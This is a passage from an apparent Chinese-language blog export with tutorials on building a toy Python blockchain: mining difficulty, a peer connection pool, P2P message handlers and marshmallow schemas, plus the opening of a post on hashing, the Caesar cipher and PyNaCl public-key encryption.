<span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">valid_block</span>(<span class="params">self,block</span>):</span><br><span class="line">        <span class="keyword">return</span> block[<span class="string">&quot;hash&quot;</span>] &lt;self.target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_block</span>(<span class="params">self,block</span>):</span><br><span class="line">        self.chain.append(block)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recalculate_target</span>(<span class="params">self,block_index</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Returns the number wu need to get below to mine a block</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> block_index % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            expected_timespan = <span class="number">10</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">            actual_timespan = self.chain[-<span class="number">1</span>][<span class="string">&quot;timestamp&quot;</span>] - self.chain[-<span class="number">10</span>][<span class="string">&quot;timestamp&quot;</span>]</span><br><span class="line"></span><br><span class="line">            ratio = actual_timespan/expected_timespan</span><br><span class="line"></span><br><span class="line">            ratio = <span class="built_in">max</span>(<span class="number">0.25</span>,ratio)</span><br><span class="line">            ratio = <span class="built_in">min</span>(<span class="number">4.00</span>,ratio)</span><br><span class="line"></span><br><span class="line">            new_target = <span class="built_in">int</span>(self.target,<span class="number">16</span>) * ratio</span><br><span class="line">            </span><br><span class="line">            self.target = <span class="built_in">format</span>(math.floor(new_target),<span class="string">&quot;x&quot;</span>).zfill(<span class="number">64</span>)</span><br><span class="line">            logger.info(<span class="string">f&quot;Calculated new mining target:<span class="subst">&#123;self.target&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.target</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_blocks_after_timestamp</span>(<span class="params">self,timestamp</span>):</span><br><span class="line">        <span class="keyword">for</span> index,block <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.chain):</span><br><span class="line">            <span class="keyword">if</span> timestamp &lt; block[<span class="string">&#x27;timestamp&#x27;</span>]:</span><br><span class="line">                <span class="keyword">return</span> self.chain[index:]</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">mine_new_block</span>(<span class="params">self</span>):</span><br><span class="line">        self.recalculate_target(self.last_block[<span class="string">&quot;index&quot;</span>]+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            new_block = self.new_block()</span><br><span class="line">            <span class="keyword">if</span> self.valid_block(new_block):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">await</span> asyncio.sleep(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">            self.chain.append(new_block)</span><br><span class="line">            logger.info(<span class="string">&quot;Found a new block:&quot;</span>,new_block)</span><br></pre></td></tr></table></figure>
<p>相比于blockchains文章（实现区块链的第二步），这里唯一的变化是添加了结构日志，将每个print()语句替换为一个有用的记录器。</p>
<h2 id="connections模块"><a href="#connections模块" class="headerlink" title="connections模块"></a>connections模块</h2><p>实现八卦协议的所需要用到的模块，相比于第四步，主要变化是附加方法：<br>get_alive_peers()和get_address_string()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConnectionPool</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) :</span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast</span>(<span class="params">self,message</span>):</span><br><span class="line">        <span class="comment"># 向所有连接的对等方广播消息的方法</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_address_string</span>(<span class="params">writer</span>):</span><br><span class="line">        <span class="comment"># 获取对等方的ip：端口（地址）</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_peer</span>(<span class="params">self,writer</span>):</span><br><span class="line">        <span class="comment"># 将对等节点添加到我们的连接池</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_peer</span> (self,writer):</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment"># 从连接池中删除对方</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_alive_peers</span>(<span class="params">self,count</span>):</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment"># 返回一些连接的对等节点</span></span><br></pre></td></tr></table></figure>
<p>其中大多数都已经在实现在networking（第四步）中，所以这里主要变化时附加方法。</p>
<p>完整实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> structlog</span><br><span class="line"><span class="keyword">from</span> more_itertools <span class="keyword">import</span> take</span><br><span class="line"></span><br><span class="line">logger = structlog.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ConnectionPool</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) :</span><br><span class="line">        self.connection_pool = <span class="built_in">dict</span>()		<span class="comment"># 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">broadcast</span>(<span class="params">self,message</span>):</span><br><span class="line">        <span class="comment"># 向所有连接的对等方广播消息的方法</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            user.writer(<span class="string">f&quot;<span class="subst">&#123;message&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_address_string</span>(<span class="params">writer</span>):</span><br><span class="line">        <span class="comment"># 获取对等方的ip：端口（地址）</span></span><br><span class="line">        ip = writer.address[<span class="string">&quot;ip&quot;</span>]</span><br><span class="line">        port = writer.address[<span class="string">&quot;port&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>		<span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_peer</span>(<span class="params">self,writer</span>):</span><br><span class="line">        <span class="comment"># 将对等节点添加到我们的连接池</span></span><br><span class="line">        address = self.get_address_string(writer)</span><br><span class="line">        self.connection_pool[address] = writer</span><br><span class="line">        logger.info(<span class="string">&quot;Added new peer to pool&quot;</span>,address = address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_peer</span> (self,writer):</span><br><span class="line">        address = self.get_address_string(writer)</span><br><span class="line">        self.connection_pool.pop(address)</span><br><span class="line">        logger.info(<span class="string">&quot;Removed peer from pool&quot;</span>,address = address)</span><br><span class="line">        <span class="comment"># 从连接池中删除对方</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_alive_peers</span>(<span class="params">self,count</span>):</span><br><span class="line">        <span class="keyword">return</span> take(count,self.connection_pool.items())<span class="comment"># 3</span></span><br><span class="line">        <span class="comment"># 返回一些连接的对等节点</span></span><br></pre></td></tr></table></figure>
<ol>
<li>使用字典dict，将地址映射到编写器（对应对等连接）</li>
<li>映射中的地址字符串是对等方的ip：port组合，这是唯一标识连接的方式</li>
<li>使用take函数从池中返回对等节点的计数</li>
</ol>
<h2 id="对等模块"><a href="#对等模块" class="headerlink" title="对等模块"></a>对等模块</h2><p>对等模块的构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">P2PError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P2Protocol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,server</span>):</span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">writer,message</span>):</span><br><span class="line">        <span class="comment"># 向特定对等方（编写器对象）发送信息</span></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理服务器传递的传入信息</span></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_ping</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入“ping”信息</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_block</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的块信息</span></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_transaction</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的交易信息</span></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_peers</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的对等方信息</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
<p>P2PError：需要一个错误类，可以用来“捕获”导入代码中的问题。</p>
<p>定义消息的基本形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">“meta<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">	&quot;</span>address<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">      		&quot;</span>ip<span class="string">&quot;:&lt;external ip:str&gt;,</span></span><br><span class="line"><span class="string">       	&quot;</span>port<span class="string">&quot;:&lt;external port:int&gt;</span></span><br><span class="line"><span class="string">   	&#125;,</span></span><br><span class="line"><span class="string">   	&quot;</span>client<span class="string">&quot;:&quot;</span>funcoin <span class="number">0.1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&quot;</span>message<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">       &quot;</span>mame<span class="string">&quot;:&lt;message name:str&gt;,</span></span><br><span class="line"><span class="string">       &quot;</span>payload<span class="string">&quot;:&lt;message payload:object&gt;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>也就是说，在P2P网络中发送的所有信息都共享此结构。元键包含有关发送信息的对等方的信息（即使该对等方是用户本身），而消息键包含正在发送的消息的名称和有效负载。对于funcoin，需要实现四个消息</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>消息名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ping</td>
<td>节点在启动连接时发送给对等方的初始信息</td>
</tr>
<tr>
<td>Transaction</td>
<td>在点对点之间传播的单个事务</td>
</tr>
<tr>
<td>Peers</td>
<td>对等方可能知道也可能不知道的一堆地址（用于构建他们的网络）</td>
</tr>
<tr>
<td>Block</td>
<td>一个区块，供对等节点添加到区块链中</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> structlog</span><br><span class="line"><span class="keyword">from</span> funcoin.messages <span class="keyword">import</span> (</span><br><span class="line">    create_peers_message,</span><br><span class="line">    create_block_message,</span><br><span class="line">    create_transaction_message,</span><br><span class="line">    create_ping_message</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> funcoin.transactions <span class="keyword">import</span> validate_transaction</span><br><span class="line"></span><br><span class="line">logger = structlog.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P2PError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P2Protocol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,server</span>):</span><br><span class="line">        self.server = server</span><br><span class="line">        self.blockchain = server.blockchain</span><br><span class="line">        self.connection_pool = server.connection_pool</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">writer,message</span>):</span><br><span class="line">        <span class="comment"># 向特定对等方（编写器对象）发送信息</span></span><br><span class="line">        writer.write(message.encode() + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_message</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理服务器传递的传入信息</span></span><br><span class="line">        message_handlers = &#123;</span><br><span class="line">            <span class="string">&quot;block&quot;</span>:self.handle_block,</span><br><span class="line">            <span class="string">&quot;ping&quot;</span>:self.handle_ping,</span><br><span class="line">            <span class="string">&quot;peers&quot;</span>:self.handle_peers,</span><br><span class="line">            <span class="string">&quot;transaction&quot;</span>:self.handle_transaction,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        handler = message_handlers.get(message[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> handler:</span><br><span class="line">            <span class="keyword">raise</span> P2PError(<span class="string">&quot;Missing handler for message&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> handler(message,writer)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_ping</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入“ping”信息</span></span><br><span class="line">        block_height = message[<span class="string">&quot;payload&quot;</span>][<span class="string">&quot;block_height&quot;</span>]</span><br><span class="line">        writer.is_miner = message[<span class="string">&quot;payload&quot;</span>][<span class="string">&quot;is_miner&quot;</span>]</span><br><span class="line">        peers = self.connection_pool.get_alive_peers(<span class="number">20</span>)</span><br><span class="line">        peers_message = create_peers_message(self.server.external_ip,self.server.external_port,peers)</span><br><span class="line">        <span class="keyword">await</span> self.send_message(writer,peers_message)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> block_height &lt; self.blockchain.last_block[<span class="string">&quot;height&quot;</span>]:</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> self.blockchain.chain[block_height + <span class="number">1</span>:]:</span><br><span class="line">                <span class="keyword">await</span> self.send_message(</span><br><span class="line">                    writer,</span><br><span class="line">                    create_block_message(</span><br><span class="line">                        self.server.external_ip,self.server.external_port,block</span><br><span class="line">                    ),</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_block</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的块信息</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Executed when we receive a block that was broadcast by a peer</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logger.info(<span class="string">&quot;Received new block&quot;</span>)</span><br><span class="line"></span><br><span class="line">        block = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line"></span><br><span class="line">        self.blockchain.add_block(block)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> peer <span class="keyword">in</span> self.connection_pool.get_alive_peers(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">await</span> self.send_message(</span><br><span class="line">                peer,</span><br><span class="line">                create_block_message(</span><br><span class="line">                    self.server.external_ip,self.server.external_port,block</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_transaction</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的交易信息</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Executed when we receive a transaction that was broadcast by a peer</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logger.info(<span class="string">&quot;Received transaction&quot;</span>)</span><br><span class="line"></span><br><span class="line">        tx = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> validate_transaction(tx) <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> tx <span class="keyword">not</span> <span class="keyword">in</span> self.blockchain.pending_transactions:</span><br><span class="line">                self.blockchain.pending_transactions.append(tx)</span><br><span class="line">                <span class="keyword">for</span> peer <span class="keyword">in</span> self.connection_pool.get_alive_peers(<span class="number">20</span>):</span><br><span class="line">                    <span class="keyword">await</span> self.send_message(</span><br><span class="line">                        peer,</span><br><span class="line">                        create_transaction_message(</span><br><span class="line">                            self.server.external_ip,self.server.external_port,tx</span><br><span class="line">                        ),</span><br><span class="line">                    )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.warning(<span class="string">&quot;Received invalid transaction&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_peers</span>(<span class="params">self,message,writer</span>):</span><br><span class="line">        <span class="comment"># 处理传入的对等方信息</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Executed when we receive a block that was broadcast by a peer</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        logger.info(<span class="string">&quot;Received new peers&quot;</span>)</span><br><span class="line"></span><br><span class="line">        peers = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line"></span><br><span class="line">        ping_message = create_ping_message(</span><br><span class="line">            self.server.external_ip,</span><br><span class="line">            self.server.external_port,</span><br><span class="line">            <span class="built_in">len</span>(self.block.chain),</span><br><span class="line">            <span class="built_in">len</span>(self.connection_pool.get_alive_peers(<span class="number">50</span>)),</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> peer <span class="keyword">in</span> peers:</span><br><span class="line">            reader,writer = <span class="keyword">await</span> asyncio.open_connection(peer[<span class="string">&quot;ip&quot;</span>],peer[<span class="string">&quot;port&quot;</span>])</span><br><span class="line"></span><br><span class="line">            self.connection_pool.add_peer(writer)</span><br><span class="line">            <span class="keyword">await</span> self.send_message(writer,ping_message)</span><br></pre></td></tr></table></figure>
<h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><h4 id="通用信息表单"><a href="#通用信息表单" class="headerlink" title="通用信息表单"></a>通用信息表单</h4><p><img src="/2023/02/07/transactional-node/image-20230209204346882.png" alt="image-20230209204346882"></p>
<h4 id="元对象"><a href="#元对象" class="headerlink" title="元对象"></a>元对象</h4><p>元对象包含在每条消息中，并包含与发送方有关的消息。</p>
<p><img src="/2023/02/07/transactional-node/image-20230209205627561.png" alt="image-20230209205627561"></p>
<h4 id="对等类型"><a href="#对等类型" class="headerlink" title="对等类型"></a>对等类型</h4><p>对等类型也相当通用。它出现在正在发送的对等方列表中，例如，加入网络的新节点，或出现在发送的每条信息的元块中。</p>
<p><img src="/2023/02/07/transactional-node/image-20230209205613643.png" alt="image-20230209205613643"></p>
<h4 id="消息对象"><a href="#消息对象" class="headerlink" title="消息对象"></a>消息对象</h4><p><img src="/2023/02/07/transactional-node/image-20230209205603176.png" alt="image-20230209205603176"></p>
<h4 id="ping有效负载"><a href="#ping有效负载" class="headerlink" title="ping有效负载"></a>ping有效负载</h4><p><img src="/2023/02/07/transactional-node/image-20230209205452724.png" alt="image-20230209205452724"></p>
<h4 id="事务有效负载"><a href="#事务有效负载" class="headerlink" title="事务有效负载"></a>事务有效负载</h4><p><img src="/2023/02/07/transactional-node/image-20230209205420078.png" alt="image-20230209205420078"></p>
<h4 id="对等有效负载"><a href="#对等有效负载" class="headerlink" title="对等有效负载"></a>对等有效负载</h4><p><img src="/2023/02/07/transactional-node/image-20230209205347085.png" alt="image-20230209205347085"></p>
<h4 id="块有效负载"><a href="#块有效负载" class="headerlink" title="块有效负载"></a>块有效负载</h4><p><img src="/2023/02/07/transactional-node/image-20230209205400827.png" alt="image-20230209205400827"></p>
<p>服务器执行操作：读取消息和发送消息。当服务器收到消息时，该消息将以JSON字符串的形式到达。然后必须将其转换为Python字典并进行验证，这个过程称为反序列化，因为我们从序列化形式(JSON)到本机python字典。序列化的工作方式正好相反：从字典转到JSON字符串。</p>
<ol>
<li>服务器读取由对等方发送的消息（反序列化：JSON-&gt;字典</li>
<li>服务器将消息发送到对等方（序列化：dict-&gt;json）</li>
</ol>
<p>验证对等对象的架构</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">from marshmallow import Schema<span class="punctuation">,</span>fields</span><br><span class="line">import time</span><br><span class="line">class Peer(Schema)<span class="punctuation">:</span></span><br><span class="line">    ip = fields.Str(required=True)</span><br><span class="line">    port = fields.Int(required=True)</span><br><span class="line">    last_seen = fields.Int(missing=lambda<span class="punctuation">:</span> int(time()))</span><br><span class="line"></span><br><span class="line"># 实例</span><br><span class="line">payload = &#x27;<span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span><span class="string">&quot;192.168.0.1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span><span class="string">&quot;8888&quot;</span><span class="punctuation">,</span><span class="attr">&quot;last_seen&quot;</span><span class="punctuation">:</span><span class="string">&quot;1589780748&quot;</span><span class="punctuation">&#125;</span>&#x27;</span><br><span class="line"># 反序列化</span><br><span class="line">result = Peer().loads(payload)</span><br><span class="line"># 序列化</span><br><span class="line">serialized = Peer().dumps(result)</span><br><span class="line">print(result)</span><br><span class="line">print(serialized)</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;ip&#x27;<span class="punctuation">:</span> &#x27;<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>&#x27;<span class="punctuation">,</span> &#x27;port&#x27;<span class="punctuation">:</span> <span class="number">8888</span><span class="punctuation">,</span> &#x27;last_seen&#x27;<span class="punctuation">:</span> <span class="number">1589780748</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.0.1&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8888</span><span class="punctuation">,</span> <span class="attr">&quot;last_seen&quot;</span><span class="punctuation">:</span> <span class="number">1589780748</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Schema模块"><a href="#Schema模块" class="headerlink" title="Schema模块"></a>Schema模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> marshmallow <span class="keyword">import</span> Schema,fields,validates_schema,ValidationError</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transaction</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    timestamp = fields.Int()</span><br><span class="line">    sender = fields.Str()</span><br><span class="line">    receiver = fields.Str()</span><br><span class="line">    amount = fields.Int()</span><br><span class="line">    signature = fields.Str()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordered = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    mined_by = fields.Str(required=<span class="literal">False</span>)</span><br><span class="line">    Transactions = fields.Nested(Transaction(),many=<span class="literal">True</span>)</span><br><span class="line">    height = fields.Int(required = <span class="literal">True</span>)</span><br><span class="line">    target = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">hash</span> = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    previous_hash = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    nonce = fields.Int(required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">        ordered = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @validates_schema</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate_hash</span>(<span class="params">self,data,**kwargs</span>):</span><br><span class="line">        block = data.copy()</span><br><span class="line">        block.pop(<span class="string">&quot;hash&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&quot;hash&quot;</span>]!=json.dumps(block,sort_keys=<span class="literal">True</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">&quot;Fraudulent block:hash is wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Peer</span>(<span class="title class_ inherited__">Schema</span>):</span><br><span class="line">    ip = fields.Str(required=<span class="literal">True</span>)</span><br><span class="line">    port = fields.Int(required=<span class="literal">True</span>)</span><br><span class="line">    last_seen = fields.Int(missing = <span class="keyword">lambda</span>:<span class="built_in">int</span>(time()))</span><br></pre></td></tr></table></figure>
<p>在代码中，我们实现了Peer、Block和Transaction。</p>
<h2 id="message模块"><a href="#message模块" class="headerlink" title="message模块"></a>message模块</h2>]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>cryptography</title>
    <url>/2023/02/06/cryptography/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>构建区块链的第五步——非对称加密的实现</p>
<span id="more"></span>
<h2 id="很简单的例子"><a href="#很简单的例子" class="headerlink" title="很简单的例子"></a>很简单的例子</h2><p>发送方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;i love akali forever&quot;</span></span><br><span class="line">hash_message = sha256((<span class="string">&quot;p@ssw0rd&quot;</span>+message).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hash_message)</span><br><span class="line"></span><br><span class="line">运行结果为：17eee37e87b84e383670221f4d5e075aa493f8f89854f52ff1832f49a07b1bf3</span><br></pre></td></tr></table></figure>
<p>接收方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">sender_message = <span class="string">&quot;i love akali forever&quot;</span></span><br><span class="line">sender_hash = <span class="string">&quot;17eee37e87b84e383670221f4d5e075aa493f8f89854f52ff1832f49a07b1bf3&quot;</span></span><br><span class="line">hash_message = sha256((<span class="string">&quot;p@ssw0rd&quot;</span>+sender_message).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hash_message == sender_hash:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Message has not been tampered with&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>存在的问题：对交易对手的信任，以及不知道特定密钥何时被泄露。</p>
<p>凯撒密码</p>
<p><img src="/2023/02/06/cryptography/image-20230206172347224.png" alt="image-20230206172347224"><br>凯撒会给收件人3的密码（密钥)。D将在加密消息中变成A。收件人将应用相反的方法，A 将变为 D。</p>
<p>这里的问题是发送密码的行为是不安全的 - 任何形式的通信都可以被监视并确定密钥。我们需要一种加密形式，无需创建和发送共享密钥的行为。这就是公钥密码学被发明并解决共享信任问题的原因。</p>
<h2 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> nacl.public <span class="keyword">import</span> PrivateKey, Box</span><br><span class="line"></span><br><span class="line">alices_private_key = PrivateKey.generate()</span><br><span class="line">bobs_private_key = PrivateKey.generate()</span><br><span class="line"></span><br><span class="line">alices_public_key = alices_private_key.public_key</span><br><span class="line">bobs_public_key = bobs_private_key.public_key</span><br><span class="line"></span><br><span class="line">bobs_box = Box(bobs_private_key,alices_public_key)</span><br><span class="line"></span><br><span class="line">encrypted = bobs_box.encrypt(<span class="string">b&quot;i am akali&quot;</span>)</span><br><span class="line"></span><br><span class="line">alices_box = Box(alices_private_key,bobs_public_key)</span><br><span class="line"></span><br><span class="line">plaintext = alices_box.decrypt(encrypted)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext.decode(<span 